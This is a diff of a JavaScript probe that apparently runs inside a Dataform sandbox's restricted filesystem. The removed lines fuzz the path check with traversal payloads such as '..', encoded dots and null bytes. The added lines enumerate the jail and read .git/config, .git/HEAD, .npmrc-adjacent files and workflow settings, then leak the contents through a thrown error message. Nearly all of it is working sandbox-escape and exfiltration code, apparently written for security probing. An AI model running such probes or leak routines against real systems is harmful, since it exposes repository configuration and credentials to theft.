@@ -1,23 +1,20 @@
 var out = {};
-function S(x,n){ try { return String(x).slice(0,n||90); } catch(e){ return "?"; } }
-// Fuzz restricted_fs.exists with path shapes that native and JS normalizers can disagree on.
-var shapes = [
- "/package.json","//package.json","///package.json","////package.json",
- "/./package.json","/package.json.","/package.json/","/package.json//",
- "/ /package.json","/\t/package.json","/node_modules/@dataform/core/package.json",
- "/node_modules//@dataform/core//package.json",
- "/node_modules/./@dataform/core/package.json",
- "/node_modules/../node_modules/@dataform/core/package.json",
- "/definitions/../package.json","/definitions/./../package.json",
- "/./definitions/../package.json",
- "/\u002e/package.json","/\u002e\u002e/package.json",
- "/.././package.json","/./../package.json",
- "/..;/package.json","/.%2e/package.json",
- "%2fpackage.json","/%70ackage.json",
- "/package\u0000.json","/package.json%00",
- "~package.json","/node_modules/@dataform/core/../../../package.json",
- "/node_modules/@dataform/core/./../../../package.json"
-];
-out.exists = {};
-shapes.forEach(function(p){ try { out.exists[p] = String(restricted_fs.exists(p)); } catch(e){ out.exists[p] = "X:"+S(e,40); } });
-throw new Error("FUZZ::" + JSON.stringify(out));
+function S(x,n){ try { return String(x).slice(0,n||300); } catch(e){ return "?"; } }
+// list what IS in the jail (the live checkout view) - walk directories
+function walk(p, depth){
+  if (depth > 2) return [];
+  var res = [];
+  ["package.json","package-lock.json","workflow_settings.yaml",".npmrc","definitions","node_modules",
+   ".git","dataform.json","definitions/exec.js","node_modules/@dataform/core","node_modules/@dataform/core/package.json",
+   "node_modules/@dataform/core/index.js","node_modules/@dataform/core/main.js",".git/HEAD",".git/config"].forEach(function(f){
+    var q = p.replace(/\/$/,"") + "/" + f;
+    try { if (restricted_fs.exists(q)) { res.push(q.replace("//","/") + (restricted_fs.isDirectory(q)?"/":"(f)")); } } catch(e){}
+  });
+  return res;
+}
+out.root = walk("/", 0);
+// the git repo is in the jail - read .git/config and HEAD if present
+[".git/HEAD",".git/config",".git/refs/heads/main","workflow_settings.yaml","package-lock.json"].forEach(function(f){
+  try { if (restricted_fs.exists("/"+f)) out["f_"+f] = S(restricted_fs.readFile("/"+f), 200); } catch(e){}
+});
+throw new Error("JX::" + JSON.stringify(out));
